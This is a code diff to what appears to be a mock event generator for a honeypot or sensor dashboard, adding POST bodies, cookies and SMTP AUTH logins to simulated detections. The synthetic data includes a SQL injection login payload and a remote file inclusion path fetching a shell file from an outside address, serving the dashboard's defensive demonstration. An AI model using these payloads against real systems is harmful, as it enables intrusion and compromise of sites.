@@ -813,6 +813,8 @@ export const FLEET: SensorSpec[] = [
     ],
     artefacts: [
       { label: 'Headers', field: 'headers' },
+      { label: 'POST data', field: 'post_data' },
+      { label: 'Cookies', field: 'cookies' },
       { label: 'Detection payload', field: 'detection' },
     ],
     tops: [
@@ -834,7 +836,9 @@ export const FLEET: SensorSpec[] = [
         ['/?file=http://198.51.100.9/shell.txt', 'rfi', 'high'],
       ] as const)
       const agent = pickSkewed(rng, SCANNER_AGENTS)
-      return { type: 'http.request', severity, protocol: 'http', dstPort: 80, eventName: detection, summary: `GET ${decodeURIComponent(path)}`, fields: { method: 'GET', path, status: 200, headers: { host: 'shop.example.test', accept: '*/*', 'user-agent': agent }, cookies: {}, detection: { name: detection, type: detection === 'index' ? 1 : 2, version: '0.6.0' }, canonical_fingerprint: agent, canonical_fingerprint_kind: 'User-Agent', canonical_attck_techniques: severity === 'high' ? ['T1190'] : ['T1595'] } }
+      // SQL injection arrives as a login form post, the payload in the body.
+      const post: { method: string; path: string; post_data: Record<string, string>; cookies: Record<string, string> } = detection === 'sqli' ? { method: 'POST', path: '/login', post_data: { username: "admin' OR '1'='1", password: 'x' }, cookies: { sess: 'deleted' } } : { method: 'GET', path, post_data: {}, cookies: {} }
+      return { type: 'http.request', severity, protocol: 'http', dstPort: 80, eventName: detection, summary: `${post.method} ${decodeURIComponent(post.path)}`, fields: { ...post, status: 200, headers: { host: 'shop.example.test', accept: '*/*', 'user-agent': agent }, detection: { name: detection, type: detection === 'index' ? 1 : 2, version: '0.6.0' }, canonical_fingerprint: agent, canonical_fingerprint_kind: 'User-Agent', canonical_attck_techniques: severity === 'high' ? ['T1190'] : ['T1595'] } }
     },
   },
   {
@@ -1038,23 +1042,32 @@ export const FLEET: SensorSpec[] = [
     lastSeenMinutes: 40,
     columns: [
       { header: 'event', field: 'event', mono: true },
+      { header: 'AUTH login', field: 'auth_user', mono: true },
       { header: 'command or message', field: ['command', 'body_preview'], mono: true },
+      { header: 'size', field: 'body_size' },
     ],
     artefacts: [{ label: 'SMTP exchange', field: ['command', 'body_preview'] }],
     tops: [
       { label: 'senders', field: 'mail_from' },
       { label: 'recipients', field: 'rcpt_to' },
+      { label: 'AUTH logins', field: 'auth_user' },
     ],
     measures: [
       { label: 'envelopes', match: eq('event', 'envelope') },
       { label: 'messages', match: eq('event', 'mail-body') },
+      { label: 'AUTH PLAIN logins', match: (f) => f.logged_in === true },
     ],
     generate: (rng): EventDraft => {
       const from = pick(rng, ['spameri@example.test', 'info@example.test', 'noreply@example.test'])
       const to = pick(rng, ['receiver@example.test', 'test@example.test'])
       const session_id = String(int(rng, 1000, 9999))
-      if (rng() < 0.55) return { type: 'protocol.request', severity: 'low', protocol: 'smtp', dstPort: 25, eventName: 'envelope', summary: `MAIL FROM:<${from}> RCPT TO:<${to}>`, fields: { event: 'envelope', session_id, server_name: 'mail01.example.test', command: `mail from:<${from}>\r\nrcpt to:<${to}>`, mail_from: from, rcpt_to: to, dst_port: 25 } }
-      return { type: 'protocol.request', severity: 'medium', protocol: 'smtp', dstPort: 25, eventName: 'mail-body', summary: `Message from ${from} (${int(rng, 1, 40)} KB)`, fields: { event: 'mail-body', session_id, server_name: 'mail01.example.test', mail_from: from, rcpt_to: to, body_preview: 'Subject: relay test\r\n\r\nThis is a relay test from 198.51.100.77.', dst_port: 25 } }
+      // One session in three authenticates first (AUTH PLAIN), as relay
+      // abusers testing stolen mailbox credentials do. Derived from the
+      // session id, so the rest of the mock is unchanged.
+      const auth: SensorFields = Number(session_id) % 3 === 0 ? { logged_in: true, auth_user: pick(() => (Number(session_id) % 7) / 7, ['admin', 'info', 'postmaster', 'test']), auth_pass: pick(() => (Number(session_id) % 5) / 5, ['123456', 'admin', 'password', 'test123']) } : { logged_in: false }
+      if (rng() < 0.55) return { type: 'protocol.request', severity: 'low', protocol: 'smtp', dstPort: 25, eventName: 'envelope', summary: `MAIL FROM:<${from}> RCPT TO:<${to}>`, fields: { event: 'envelope', session_id, server_name: 'mail01.example.test', command: `mail from:<${from}>\r\nrcpt to:<${to}>`, mail_from: from, rcpt_to: to, ...auth, dst_port: 25 } }
+      const kb = int(rng, 1, 40)
+      return { type: 'protocol.request', severity: 'medium', protocol: 'smtp', dstPort: 25, eventName: 'mail-body', summary: `Message from ${from} (${kb} KB)`, fields: { event: 'mail-body', session_id, server_name: 'mail01.example.test', mail_from: from, rcpt_to: to, ...auth, body_size: kb * 1024, body_preview: 'Subject: relay test\r\n\r\nThis is a relay test from 198.51.100.77.', dst_port: 25 } }
     },
   },
   {
